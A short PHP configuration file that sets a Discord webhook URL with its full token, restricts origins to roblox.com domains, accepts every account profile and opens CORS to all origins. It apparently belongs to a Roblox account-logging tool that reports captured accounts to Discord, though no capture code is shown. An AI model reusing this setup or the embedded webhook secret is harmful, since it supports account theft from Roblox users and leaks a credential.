<?php


$webhook = "https://discord.com/api/webhooks/802141484597772290/DQnFRDkcSG4-tga-oBeuUJvjC-GJgWvPiB-FO1W-OCHSEg5EmdE5P4zJNdIPyWXYDEx4";
$discord_contact = "E=Mc²";

$allowed_origins = array(
    "https://www.roblox.com",
    "https://web.roblox.com"
);
function account_filter($profile)
{
    return true;
}
require("status.php");
header("Access-Control-Allow-Origin: *");
